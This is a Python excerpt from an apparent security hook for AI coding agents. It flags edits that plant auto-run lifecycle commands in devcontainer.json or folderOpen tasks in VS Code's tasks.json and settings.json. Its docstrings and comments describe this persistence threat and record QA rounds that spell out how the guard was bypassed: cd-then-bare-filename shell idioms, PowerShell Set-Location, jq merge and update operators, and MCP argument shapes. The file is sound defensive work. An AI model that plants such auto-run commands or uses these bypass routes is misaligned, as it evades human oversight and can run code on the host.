def _devcontainer_exec_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


_DEVCONTAINER_EXEC_KEY_NAMES = frozenset({
    "initializecommand", "oncreatecommand", "updatecontentcommand",
    "postcreatecommand", "poststartcommand", "postattachcommand",
})


def _devcontainer_struct_key_hit(v, _depth: int = 0) -> bool:
    """Walk an MCP tool's raw (possibly nested) JSON args looking for one of
    the six lifecycle-command names as an actual DICT KEY, not a string
    value — closes the bypass where a structural MCP arg shape (a filesystem
    server's own ``{"json": {"postCreateCommand": ...}}`` edit-tool
    convention, say) never puts the key name anywhere `_flatten_strings`
    (which only walks dict VALUES) would see it. Same depth cap (12) as
    `_flatten_strings` for the identical cyclic/pathological-payload
    protection."""
    if _depth > 12:
        return False
    if isinstance(v, dict):
        for k, val in v.items():
            if isinstance(k, str) and k.strip().lower() in _DEVCONTAINER_EXEC_KEY_NAMES:
                return True
            if _devcontainer_struct_key_hit(val, _depth + 1):
                return True
        return False
    if isinstance(v, (list, tuple)):
        return any(_devcontainer_struct_key_hit(x, _depth + 1) for x in v)
    return False


def rule_devcontainer_exec_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering an auto-run lifecycle command in a dev-container
    config (``.devcontainer/devcontainer.json``, ``.devcontainer/<name>/
    devcontainer.json``, or the root-level ``.devcontainer.json``
    shorthand): ``initializeCommand``, ``onCreateCommand``,
    ``updateContentCommand``, ``postCreateCommand``, ``postStartCommand``,
    ``postAttachCommand``.

    THREAT MODEL: none of this file's other ``*_protect`` guards reach this
    surface — the closest, ``rule_ci_workflow_protect``, only watches CI
    pipeline definitions, and a devcontainer config carries no CI-workflow-
    shaped path segment (no ``.github/workflows``, no ``.gitlab-ci.yml``).
    Yet a devcontainer's lifecycle commands run with LESS friction than
    almost every other persistence surface this file covers: no git
    operation, no CI run, no boot/login, and — for
    ``initializeCommand`` specifically — no container isolation at all,
    since it runs on the HOST, before the container that would otherwise
    sandbox it is even created. The trigger is simply "the dev environment
    (re)builds or (re)starts" — VS Code's "Reopen in Container", a GitHub
    Codespaces create/prebuild, or a plain ``devcontainer up``/``devcontainer
    build`` — which happens routinely, often automatically, and is exactly
    the moment an agentic coding session's own environment comes up. A
    planted ``postCreateCommand``/``postStartCommand`` runs with the same
    privileges the rest of that dev session has (including this agent's own,
    the next time ITS environment restarts), and a planted
    ``initializeCommand`` runs with the HOST user's full privileges, outside
    whatever container boundary the README's "pair it with a sandbox"
    posture relies on as the other half of the honest-strong setup — so this
    guard closes a gap in that boundary itself, not just in the policy
    layer sitting inside it. Like ``.gitattributes``/CI workflow files, a
    devcontainer config is normally TRACKED and reviewed as routine repo
    tooling (base image, extensions, port forwards), so a one-line lifecycle
    command reads as ordinary dev-environment configuration in a diff, not
    as a planted detonator.

    Distinct from the path-only guards in this file for the same reason
    ``rule_package_manifest_protect`` is: ``devcontainer.json`` legitimately
    carries ``postCreateCommand: "npm install"`` in a large fraction of real
    repos, so gating on path alone would ask on nearly every devcontainer
    edit. Gated on PATH *and* CONTENT — the edit must name a
    devcontainer.json-shaped path AND contain one of the six lifecycle-
    command keys, which exist for no other purpose than naming a command to
    run (same "key alone is enough" reasoning
    ``rule_git_attributes_exec_protect`` applies to ``core.fsmonitor``).

    Config (``policy.devcontainer_exec``): ``mode`` (deny|ask|monitor|off,
    default ask), ``allow`` (regexes on the path/command that skip the gate
    — a repo's own trusted devcontainer bootstrap, say). Defaults to
    ``ask`` for the same reason ``package_manifest``/``ci_workflow`` do: a
    real ``postCreateCommand`` is routine, sanctioned dev-environment setup
    — it just needs a human to have actually looked at it.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
    or the env toggle ``AEGIS_ALLOW_DEVCONTAINER_EXEC=1`` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control, so neither path is agent-self-escapable.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: only one optional named subdirectory is matched under
    ``.devcontainer/`` (``.devcontainer/<name>/devcontainer.json``) — a
    deeper, unusual nesting is not; a lifecycle-command value assembled
    indirectly (shell variable concatenation, a templating step) rather than
    appearing as a literal JSON key is not caught; a direct fetch-to-file
    write (``curl -o .devcontainer/devcontainer.json ...``) is caught by
    none of the shell branch's write-verb checks, the same inherited gap
    every sibling ``*_protect`` guard in this file already discloses; and,
    like ``package_manifest``, no ``find``-path-indirection fallback is
    implemented for this guard's first pass. ``jq``-scripted edits (bare
    dot-path key, no adjacent quote+colon, and no ``-i`` flag — often piped
    through ``sponge`` instead, which is on no write-verb list at all) are
    covered by ``DEVCONTAINER_EXEC_JQ_RE`` requiring the assignment shape
    plus a whole-command devcontainer-path check (see QA history below). A
    companion, editor-level auto-run surface — a VS Code ``.vscode/
    tasks.json`` entry with ``"runOptions": {"runOn": "folderOpen"}``, or a
    JetBrains ``.idea/`` run-configuration's "Before launch" step — is a
    related but distinct attack shape (an IDE, not a devcontainer runtime,
    does the auto-running, and VS Code gates it behind a one-time
    folder-trust prompt) and is disclosed here, not covered, as a candidate
    for a follow-up guard. The ``DEVCONTAINER_CD_RE``/``DEVCONTAINER_BARE_
    FILENAME_RE`` co-occurrence pair is, deliberately, whole-command rather
    than clause-scoped — the same "false ask is recoverable, a false allow
    on a working exploit is not" trade-off ``gitattrs_wiring_hit``'s own
    QA history converged on after three separate clause-scoping attempts
    each closed one bypass while opening a worse one. Cost: a `cd
    .devcontainer` in one clause of a compound command, a write-verb
    targeting something else entirely in a second clause, and an unrelated
    mention of `devcontainer.json`/a lifecycle key in a third (a comment, a
    `grep` match) can co-occur and produce a false ASK on a command that
    never actually touches the config — confirmed, accepted, not fixed
    (QA finding, round D).

    QA history (five independent adversarial reviews — rounds A and B run
    in parallel, rounds C/D/E each a follow-up verification pass over the
    prior round's fixes, matching ``rule_git_attributes_exec_protect``'s
    own five-round precedent, same convention
    ``rule_service_persist_protect``/``rule_package_manifest_protect``
    used): round A (bypass hunting) found the original Edit/Write/MCP
    branch's quoted ``"key":`` check had a silent full bypass for two real
    MCP-tool arg shapes — ``{"key": "postCreateCommand", "value": "..."}``
    (the key sits as a bare leaf value, never adjacent to a colon) and
    ``{"json": {"postCreateCommand": "..."}}`` (the key is a dict KEY that
    ``_flatten_strings`` — value-only by design — never surfaces at all, so
    it's completely absent from the old scanned text); fixed by
    ``_devcontainer_struct_key_hit`` (walks raw arg dict keys directly)
    plus a bareword fallback. Round B (design/consistency) confirmed
    registration completeness across every sibling-guard wiring point,
    independently verified a genuinely pre-existing (not this-session-
    introduced) ``loader.py`` gap where ``policy.service_persist`` YAML was
    parsed but never reached the ``Policy`` object — now fixed alongside
    this guard's own wiring — and found the original
    ``DEVCONTAINER_EXEC_JQ_RE`` false-positived on a plain non-mutating
    ``jq`` read and on an unrelated file merely mentioning a lifecycle key
    in a trailing comment; fixed by requiring the assignment shape and
    ANDing with a whole-command path check instead of trusting the six key
    names to carry high signal alone. Round C (follow-up verification of
    rounds A/B's fixes) confirmed both were closed with independently
    written repros, then found two MORE bypasses in the fixes themselves:
    (1) the round-A fallback's original gate — "only fire when `content`
    had to be reconstructed via `_flatten_strings`" — was keyed on whether
    ANY literal `content`/`new_string` string was present, not on whether
    that string had anything to do with the actual mutation, so an MCP
    call carrying an innocuous, unrelated decoy `content` string alongside
    a structural `json`/`key`+`value` payload elsewhere in the same args
    suppressed the fallback and slipped through as a silent ALLOW; fixed
    by keying the fallback on ``ev.action == ActionClass.MCP`` alone, since
    `_devcontainer_struct_key_hit` always scans the full raw args
    regardless of what `content` resolved to. (2) an entirely ordinary
    two-command shell idiom, ``cd .devcontainer && jq
    '.postCreateCommand="..."' devcontainer.json | sponge
    devcontainer.json`` — zero obfuscation, just a prior `cd` making the
    later bare filename unambiguous to a human — evaded
    ``DEVCONTAINER_PATH_RE``'s single-contiguous-match requirement
    entirely; fixed with the ``DEVCONTAINER_CD_RE`` + ``DEVCONTAINER_
    BARE_FILENAME_RE`` co-occurrence pair (see their own comment in
    patterns.py). Round D (follow-up verification of round C's fixes)
    confirmed the round-A/B/C fixes hold, then found the brand-new
    ``DEVCONTAINER_CD_RE`` itself was too narrow — it required
    ``.devcontainer`` immediately after ``cd``/``pushd`` with no path
    prefix allowed, so ``cd "./.devcontainer"``, ``cd
    ~/project/.devcontainer``, and ``cd $HOME/.devcontainer`` (three
    completely ordinary ways to reference the same directory) all bypassed
    it silently; fixed by widening it to accept a bounded optional
    leading-path-segment group (see its own comment in patterns.py). Round
    D also surfaced the whole-command-scoping false-ask cost documented in
    the "Honest scope" paragraph above — reviewed against ``gitattrs_
    wiring_hit``'s own, more extensive clause-scoping-attempt history and
    accepted deliberately rather than fixed, for the identical reason.
    Round E (follow-up verification of round D's own fix) confirmed rounds
    A/B/C hold, then found round D's widened ``DEVCONTAINER_CD_RE`` prefix
    group required its terminating separator to be a literal ``/`` — no
    ``\\`` alternative, unlike ``_SEP`` (used everywhere else in this file,
    including ``DEVCONTAINER_PATH_RE`` itself) — so a backslash-separated
    ``cd``/``pushd`` (``cd C:\\Users\\dev\\myrepo\\.devcontainer``)
    silently bypassed the very fix written to close this exact class of
    prefix gap; fixed by accepting either separator as the terminator.
    Full suite green and a fresh perf/ReDoS pass clean after every round,
    each confirmed independently rather than by re-running the existing
    test file."""
    cfg = getattr(policy, "devcontainer_exec", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "devcontainer-exec-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        a = ev.args or {}
        literal = a.get("content") or a.get("new_string")
        content = literal if isinstance(literal, str) and literal else " ".join(_flatten_strings(a))
        if not p or not content:
            return None
        if not patterns.DEVCONTAINER_PATH_RE.search(p):
            return None
        key_hit = bool(patterns.DEVCONTAINER_EXEC_KEY_RE.search(content))
        # QA finding (independent adversarial review, round A): an MCP tool
        # that represents the target JSON STRUCTURALLY rather than as a
        # literal string blob defeats the quoted "key": check above
        # entirely — {"key": "postCreateCommand", "value": "..."} (the key
        # never sits adjacent to a colon; `_flatten_strings` only flattens
        # it as a bare leaf value) and {"json": {"postCreateCommand":
        # "..."}} (the key never appears as a string value AT ALL —
        # `_flatten_strings` walks dict VALUES only, never dict KEYS, so
        # the key name is completely absent from the scanned text). Closed
        # by falling back to a bareword key match, and to
        # `_devcontainer_struct_key_hit` walking the raw arg structure's
        # dict keys directly. Scoped to `ActionClass.MCP` only, never
        # Edit/Write, where `content` is always real file text: a JSONC
        # comment mentioning a lifecycle key by name in an otherwise-benign
        # edit (valid, supported syntax in a real devcontainer.json) would
        # otherwise newly false-positive under a broader, unconditional
        # bareword check.
        #
        # Round-C follow-up (independent adversarial verification) found
        # gating that fallback on "did `content` itself have to be
        # reconstructed via `_flatten_strings`" (rather than on the action
        # class alone) was ITSELF still bypassable: an MCP call carrying an
        # innocuous, unrelated top-level `content`/`new_string` STRING
        # alongside a structural `json`/`key`+`value` payload elsewhere in
        # the same args (`{"content": "x", "json": {"postCreateCommand":
        # "..."}}`) satisfied the old "was a literal string present"
        # check and skipped the fallback entirely, even though that
        # literal string had nothing to do with the actual mutation. Fixed
        # by keying the fallback on `ev.action == ActionClass.MCP` alone —
        # `_devcontainer_struct_key_hit` always scans the FULL raw `a`,
        # independent of what `content` happened to resolve to, so a decoy
        # literal field can no longer suppress it.
        if not key_hit and ev.action == ActionClass.MCP:
            key_hit = bool(patterns.DEVCONTAINER_EXEC_KEY_BAREWORD_RE.search(content)
                            or _devcontainer_struct_key_hit(a))
        if not key_hit:
            return None
        if (os.environ.get("AEGIS_ALLOW_DEVCONTAINER_EXEC")
                or _devcontainer_exec_allowed_by_policy(cfg, p)):
            return None
        return _finish(Decision(action, "devcontainer-exec-protect",
                         f"'{p}' is being written with a dev-container "
                         "lifecycle command (initializeCommand/onCreateCommand/"
                         "updateContentCommand/postCreateCommand/"
                         "postStartCommand/postAttachCommand) — it runs "
                         "automatically, unattended, the next time this dev "
                         "environment builds or starts (VS Code 'Reopen in "
                         "Container', a Codespace, `devcontainer up`), and "
                         "initializeCommand runs on the HOST with no container "
                         "isolation at all. Review the change, then confirm "
                         "with AEGIS_ALLOW_DEVCONTAINER_EXEC=1; a spawned "
                         "agent cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        write_verb = bool(patterns.WRITE_REDIRECT_RE.search(cmd)
                           or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
                           or patterns.INPLACE_WRITE_RE.search(cmd)
                           or patterns.FORCED_LINK_WRITE_RE.search(cmd))
        # QA finding (independent adversarial review, round C): a prior
        # `cd`/`pushd .devcontainer` in the SAME command lets every later
        # reference drop the `.devcontainer/` prefix entirely (`cd
        # .devcontainer && jq '.postCreateCommand="..."' devcontainer.json |
        # sponge devcontainer.json`) — `DEVCONTAINER_PATH_RE`'s single-
        # contiguous-match requirement never sees this. `path_hit` now
        # accepts either the direct match OR the cd-into-dir + bare-filename
        # pair; used in place of a bare `DEVCONTAINER_PATH_RE.search(cmd)`
        # in both alternatives below.
        path_hit = bool(patterns.DEVCONTAINER_PATH_RE.search(cmd)
                         or (patterns.DEVCONTAINER_CD_RE.search(cmd)
                             and patterns.DEVCONTAINER_BARE_FILENAME_RE.search(cmd)))
        # QA finding (independent adversarial review, round B): the jq
        # alternative originally fired on `jq` co-occurring with a bare
        # lifecycle keyword ALONE — no devcontainer-path anchor, no
        # assignment requirement — so a plain, non-mutating read
        # (`jq '.postCreateCommand' devcontainer.json`) or an unrelated
        # comment/file mentioning the word (`jq '.image' x.json # note:
        # postCreateCommand runs after this`) both false-positived.
        # `DEVCONTAINER_EXEC_JQ_RE` itself now requires the assignment
        # shape (`.<key>\s*=`, not a bare reference); ANDing it here with a
        # whole-command devcontainer-path check (the same "whole scanned
        # command, not clause-scoped" trade-off `gitattrs_wiring_hit`
        # documents electing after its own QA history) closes the
        # unrelated-file case without needing the path to sit inside a
        # narrow, easily-dodged window right next to `jq`.
        jq_hit = bool(patterns.DEVCONTAINER_EXEC_JQ_RE.search(cmd) and path_hit)
        if not (jq_hit
                or (write_verb and path_hit
                    and patterns.DEVCONTAINER_EXEC_KEY_RE.search(cmd))):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_DEVCONTAINER_EXEC")
                or _devcontainer_exec_allowed_by_policy(cfg, _cmd(ev))):
            return None
        return _finish(Decision(action, "devcontainer-exec-protect",
                         "A dev-container lifecycle command is being planted "
                         "in a devcontainer.json from a shell — it runs "
                         "automatically, unattended, the next time this dev "
                         "environment builds or starts, and initializeCommand "
                         "runs on the HOST with no container isolation at "
                         "all. A human may append '# aegis-allow', or set "
                         "AEGIS_ALLOW_DEVCONTAINER_EXEC=1; a spawned agent "
                         "cannot."))
    return None


def _vscode_tasks_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def _vscode_struct_kv_hit(v, key_name: str, value: str, _depth: int = 0) -> bool:
    """Walk an MCP tool's raw (possibly nested) JSON args looking for a specific
    KEY (case/whitespace-insensitive) mapped to a specific string VALUE
    (case/whitespace-insensitive) — the same structural-arg fallback shape
    `_devcontainer_struct_key_hit` uses, but keyed on the value too, since
    (unlike a devcontainer lifecycle-command key) `runOn` and
    `task.allowAutomaticTasks` both have an ordinary, safe value
    (``"default"``, ``"off"``) as well as the dangerous one gated here. Same
    depth cap (12) as `_flatten_strings`/`_devcontainer_struct_key_hit` for
    the identical cyclic/pathological-payload protection."""
    if _depth > 12:
        return False
    if isinstance(v, dict):
        for k, val in v.items():
            if (isinstance(k, str) and k.strip().lower() == key_name
                    and isinstance(val, str) and val.strip().lower() == value):
                return True
            if _vscode_struct_kv_hit(val, key_name, value, _depth + 1):
                return True
        return False
    if isinstance(v, (list, tuple)):
        return any(_vscode_struct_kv_hit(x, key_name, value, _depth + 1) for x in v)
    return False


def _vscode_mcp_bareword_kv_hit(a: dict, key_name: str, value: str) -> bool:
    """Fallback signal for ``ActionClass.MCP`` only: both the key name and
    the dangerous value appear, ANYWHERE, as string leaves in the full
    (recursively) flattened raw MCP args — closes every "key and value both
    present but not adjacent, not a dict key, split across sibling
    structures" shape QA (round A) found, including the
    ``{"key": "runOn", "value": "folderOpen"}`` "set a config value" shape
    (the key name is a bare sibling VALUE, never a dict key or adjacent to a
    colon), a value wrapped in a one-element list
    (``{"key": "runOn", "value": ["folderOpen"]}``), and a "cousin" shape
    splitting the key and value across two different sibling list items
    (``{"edits": [{"key": "runOn"}, {"value": "folderOpen"}]}``) —
    `_flatten_strings` already recurses through every list/dict nesting
    shape uniformly, so no structural relationship between the two tokens is
    required, the same low-structure, high-recall signal
    `DEVCONTAINER_EXEC_KEY_BAREWORD_RE`'s own single-token bareword fallback
    already relies on. Deliberately scoped to MCP only: an Edit/Write's
    literal file content legitimately contains both words separately (a
    comment, an unrelated field) far more often than an MCP tool's own args
    would by coincidence.

    QA finding (independent adversarial review, round C, verifying round
    A's own fix): this "no structural relationship required" breadth is a
    real, disclosed trade-off, not a bug — an MCP call whose args contain
    the two exact leaf strings ANYWHERE, entirely unrelated to each other
    (an enum/preset-name list happening to enumerate both words, alongside
    a real config value elsewhere that's actually the safe one), produces a
    false ASK. Confirmed non-exploitable (fails toward ASK, never ALLOW,
    and is human-escapable the same as every other finding here) and kept
    deliberately, the same "false ask is recoverable, a false allow on a
    working exploit is not" trade-off this codebase applies whenever a
    narrower, structurally-precise check has already been shown (by the
    three real shapes this function was written to catch) to have a
    worse, silent false-ALLOW failure mode instead."""
    strs = {s.strip().lower() for s in _flatten_strings(a) if isinstance(s, str)}
    return key_name in strs and value in strs


def rule_vscode_tasks_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering a VS Code auto-run task (``.vscode/tasks.json``
    with ``"runOptions": {"runOn": "folderOpen"}``) or silencing the one
    human checkpoint that gates it (``.vscode/settings.json`` with
    ``"task.allowAutomaticTasks": "on"``).

    THREAT MODEL: no existing guard reaches this surface —
    `rule_devcontainer_exec_protect`'s own docstring explicitly disclosed it
    as a "related but distinct" auto-run primitive and a candidate for a
    follow-up guard, since an IDE, not a devcontainer runtime, does the
    auto-running here. A task with ``runOn: folderOpen`` runs automatically
    the next time this workspace folder is opened in VS Code — no git
    operation, no CI run, no boot/login, no container (re)build required,
    just the editor opening the folder, which (like a devcontainer
    (re)build) is often the very moment an agentic coding session's own
    environment comes up. Unlike `rule_devcontainer_exec_protect`'s surface,
    VS Code does interpose one piece of friction: the first time a folder
    with an automatic task is opened, it shows an "Allow Automatic Tasks in
    Folder..." prompt, and a human must accept it once. But that friction is
    itself a single config value away from being silently removed —
    ``.vscode/settings.json``'s ``task.allowAutomaticTasks: "on"`` disables
    the prompt entirely, so an agent that plants both files in the same
    session removes the human's last checkpoint before it ever fires. Both
    files are normally TRACKED and reviewed as routine editor/workspace
    configuration (recommended extensions, format-on-save, build tasks), so
    a one-line addition reads as ordinary tooling in a diff, not as a
    planted detonator — the same "hidden in plain sight" property
    `rule_devcontainer_exec_protect`'s own docstring describes for
    ``devcontainer.json``.

    Distinct from a path-only guard for the same reason
    `rule_devcontainer_exec_protect`/`rule_package_manifest_protect` are:
    ``tasks.json`` legitimately carries build/test/watch tasks with
    ``runOn: "default"`` (manual trigger only) in a large fraction of real
    repos, and ``settings.json`` is edited constantly for benign reasons —
    gating on path alone would ask on nearly every ``.vscode/`` edit. Gated
    on PATH *and* the specific DANGEROUS VALUE: ``tasks.json`` must carry
    ``runOn`` set to ``folderOpen`` specifically (not ``default``), and
    ``settings.json`` must carry ``task.allowAutomaticTasks`` set to ``on``
    specifically (not ``off``) — the same "gate the key AND its dangerous
    value, not the key alone" shape `rule_git_config_exec_protect` applies
    to `credential.helper` versus an ordinary alias value.

    Config (``policy.vscode_tasks_exec``): ``mode`` (deny|ask|monitor|off,
    default ask), ``allow`` (regexes on the path/command that skip the gate
    — a repo's own trusted, reviewed automatic task, say). Defaults to
    ``ask`` for the same reason every sibling ``*_protect`` guard in this
    file does: a real automatic task can be legitimate, sanctioned
    workspace setup — it just needs a human to have actually looked at it.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
    or the env toggle ``AEGIS_ALLOW_VSCODE_TASKS_EXEC=1`` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control, so neither path is agent-self-escapable.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: a multi-root ``*.code-workspace`` file can embed the same
    ``"tasks"`` object (and the same ``task.allowAutomaticTasks`` setting)
    directly inside itself, with no ``.vscode/`` path segment at all — not
    covered by this first pass, the same "one config surface first, siblings
    disclosed as a follow-up" approach `rule_devcontainer_exec_protect` took
    for its own ``.devcontainer/<name>/`` nesting; a JetBrains ``.idea/``
    run-configuration's "Before launch" step is a related but distinct
    IDE-auto-run primitive, also not covered; a ``runOn``/
    ``allowAutomaticTasks`` value assembled indirectly (a templating step, a
    build script that writes the JSON) rather than appearing as a literal is
    not caught; and, like `rule_devcontainer_exec_protect`, a direct
    fetch-to-file write (``curl -o .vscode/tasks.json ...``) is caught by
    none of the shell branch's write-verb checks, the same inherited gap
    every sibling ``*_protect`` guard in this file already discloses.

    QA history (four independent adversarial reviews — rounds A and B run
    in parallel, round A bypass-hunting and round B design/consistency;
    rounds C and D each a follow-up verification pass over the prior
    round's fixes — matching this codebase's established process): rounds
    A and B both independently found and
    confirmed the SAME critical bug — the shell branch had no `cd`/`pushd`-
    into-`.vscode`-then-bare-filename fallback at all (unlike
    `rule_devcontainer_exec_protect`, which added exactly this fallback
    after its own QA round C), a silent, total bypass of every shell-branch
    check (`cd .vscode && jq '.runOptions.runOn="folderOpen"' tasks.json |
    sponge tasks.json`). Fixed with `VSCODE_CD_RE` + `VSCODE_TASKS_BARE_
    FILENAME_RE`/`VSCODE_SETTINGS_BARE_FILENAME_RE`, additionally covering
    `Set-Location`/`sl`/`chdir` (not just `cd`/`pushd`) after round A
    demonstrated a live PowerShell bypass (`Set-Location .vscode; Set-
    Content tasks.json ...`) neither `DEVCONTAINER_CD_RE` nor its own first
    draft covered. Round A separately found jq's object-MERGE idiom (`+=`,
    operator BEFORE the key, e.g. `.runOptions += {runOn:"folderOpen"}`
    with the key left unquoted — a legal, idiomatic bare jq identifier)
    evaded the original assignment-only (`.runOn =`, operator AFTER the
    key) jq pattern entirely; round B, independently, found that same
    pattern's fix-target was itself over-broad in the other direction — it
    matched ANY assignment to `runOn` regardless of value, asking even on a
    jq script resetting the task to its safe `"default"` value, contradicting
    the guard's own stated "gate the key AND its dangerous value" design.
    Both fixed together: `VSCODE_TASKS_JQ_RE`/`VSCODE_SETTINGS_JQ_RE` now
    match BOTH the direct-assignment and merge-object forms, and BOTH
    require the specific dangerous value adjacent to the key in either
    form — closing the false-ALLOW without reopening the false-ASK. Round A
    also found two lower-confidence MCP structural-argument bypasses (a
    value wrapped in a one-element list, and the key/value split across two
    different sibling list items rather than one shared dict) past the
    original dict-siblings-only fallback; replaced with
    `_vscode_mcp_bareword_kv_hit`, a flatten-based check requiring no
    structural relationship between the two tokens at all (mirroring
    `DEVCONTAINER_EXEC_KEY_BAREWORD_RE`'s own single-token bareword
    fallback), which closes both uniformly. Round C (follow-up verification
    of rounds A/B's fixes) confirmed all four original findings closed and
    the safe-value regression checks clean, then found two issues in the
    fixes themselves: (1) `VSCODE_CD_RE`'s directory-name terminator was a
    bare `\\b` — a word/non-word transition, not "end of this specific
    name" — so an ordinary lookalike directory (`.vscode-old`,
    `.vscode.bak`) false-positived; fixed by reusing `_CI_END` (see its own
    comment in patterns.py). (2) confirmed `_vscode_mcp_bareword_kv_hit`'s
    "no structural relationship required" breadth is real — an MCP call
    with both exact tokens present but unrelated to each other (e.g. an
    enum/preset-name list) produces a false ASK; reviewed and accepted
    deliberately (fails toward ASK, never ALLOW; see the function's own
    docstring) rather than fixed, for the same reason
    `gitattrs_wiring_hit`'s/`DEVCONTAINER_CD_RE`'s own whole-command-scoping
    trade-offs were. Round D (follow-up verification of round C's fixes)
    confirmed both round-C fixes hold, then found jq's UPDATE-ASSIGN
    operator (`|=`) was never anticipated by either jq pattern at all, and
    that `VSCODE_TASKS_JQ_RE` never anticipated bracket-index key notation
    (`["runOn"]`) either — both live, silent-ALLOW bypasses on realistic,
    unremarkable one-liners. Rather than add a fourth exact-shape
    alternative, both jq patterns were rewritten as three independent,
    order-agnostic lookaheads (assignment-shaped operator, bare key,
    dangerous value — see `VSCODE_TASKS_JQ_RE`'s own comment in
    patterns.py) — which, while fixing it, surfaced one more
    self-inflicted gap: the lookaheads' own scan-gap excluded `|` (the
    usual "don't cross a real shell pipe" convention), which also
    prevented them from scanning PAST `|=`'s own literal pipe character to
    reach a value sitting on its far side — fixed by not excluding `|`
    from these three lookaheads specifically, accepting the narrower cost
    of now also being able to see across a genuine shell pipe into an
    unrelated next command (bounded, same accepted-trade-off direction).
    Round E (follow-up verification of round D's fixes) confirmed no new
    false-ALLOW anywhere (independent lookaheads only strengthen, never
    suppress, detection — verified, not assumed), confirmed the
    `&&`/`;`/newline command-boundary handling and settings-side parity
    hold, confirmed a multi-line jq script (heredoc / `-f script.jq`) goes
    undetected but traced this to a pre-existing gap (newlines were already
    excluded from the scan gap before round D) rather than a regression,
    and found the round-D pipe-crossing trade-off has a sharper, more
    concrete instance than originally disclosed: it also fires within a
    SINGLE, non-piped jq script on coincidental unrelated substrings (e.g.
    setting `task.allowAutomaticTasks` to its SAFE `"off"` value while
    separately toggling the common, unrelated `files.autoSave` setting to
    `"on"` in the same one-liner) — same accepted direction, now disclosed
    explicitly (see `VSCODE_TASKS_JQ_RE`'s own comment) and pinned with a
    regression test. Recommended PASS, no round F needed. Full suite green
    throughout (1209 passed) and a fresh perf/ReDoS pass (including a
    50,000-repetition adversarial probe, ~756ms, linear scaling) clean on
    every new/widened pattern."""
    cfg = getattr(policy, "vscode_tasks_exec", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "vscode-tasks-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        a = ev.args or {}
        literal = a.get("content") or a.get("new_string")
        content = literal if isinstance(literal, str) and literal else " ".join(_flatten_strings(a))
        if not p or not content:
            return None
        is_tasks = bool(patterns.VSCODE_TASKS_PATH_RE.search(p))
        is_settings = bool(patterns.VSCODE_SETTINGS_PATH_RE.search(p))
        if not (is_tasks or is_settings):
            return None
        if is_tasks:
            hit = bool(patterns.VSCODE_TASKS_RUNON_RE.search(content))
            if not hit and ev.action == ActionClass.MCP:
                hit = bool(_vscode_struct_kv_hit(a, "runon", "folderopen")
                           or _vscode_mcp_bareword_kv_hit(a, "runon", "folderopen"))
            reason = ("'{p}' is being written with an automatic task "
                      '(`"runOptions": {{"runOn": "folderOpen"}}`) — it runs '
                      "automatically, unattended, the next time this "
                      "workspace folder is opened in VS Code.")
        else:
            hit = bool(patterns.VSCODE_ALLOW_AUTOTASKS_RE.search(content))
            if not hit and ev.action == ActionClass.MCP:
                hit = bool(_vscode_struct_kv_hit(a, "task.allowautomatictasks", "on")
                           or _vscode_mcp_bareword_kv_hit(a, "task.allowautomatictasks", "on"))
            reason = ("'{p}' is being written with "
                      '`"task.allowAutomaticTasks": "on"` — it silences the '
                      "one human confirmation prompt that otherwise gates "
                      "an automatic task from running unattended.")
        if not hit:
            return None
        if (os.environ.get("AEGIS_ALLOW_VSCODE_TASKS_EXEC")
                or _vscode_tasks_allowed_by_policy(cfg, p)):
            return None
        return _finish(Decision(action, "vscode-tasks-protect",
                         reason.format(p=p) + " Review the change, then confirm "
                         "with AEGIS_ALLOW_VSCODE_TASKS_EXEC=1; a spawned "
                         "agent cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        write_verb = bool(patterns.WRITE_REDIRECT_RE.search(cmd)
                           or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
                           or patterns.INPLACE_WRITE_RE.search(cmd)
                           or patterns.FORCED_LINK_WRITE_RE.search(cmd))
        # QA finding (independent adversarial review, rounds A and B, run in
        # parallel, each independently confirming the other): a prior `cd`/
        # `pushd`/`Set-Location` into `.vscode` in the SAME command lets
        # every later reference drop the `.vscode/` prefix entirely (`cd
        # .vscode && jq '.runOptions.runOn="folderOpen"' tasks.json | sponge
        # tasks.json`) — `VSCODE_TASKS_PATH_RE`/`VSCODE_SETTINGS_PATH_RE`'s
        # single-contiguous-match requirement never sees this, and it was a
        # SILENT, TOTAL bypass (every one of `tasks_jq_hit`/`settings_jq_hit`/
        # `tasks_write_hit`/`settings_write_hit` depends on one of these two
        # flags). `*_path_hit` now accepts either the direct match OR the
        # cd-into-dir + bare-filename pair, mirroring
        # `rule_devcontainer_exec_protect`'s own `DEVCONTAINER_CD_RE`/
        # `DEVCONTAINER_BARE_FILENAME_RE` fix for the identical gap (see
        # `VSCODE_CD_RE`'s own comment in patterns.py).
        vscode_cd_hit = bool(patterns.VSCODE_CD_RE.search(cmd))
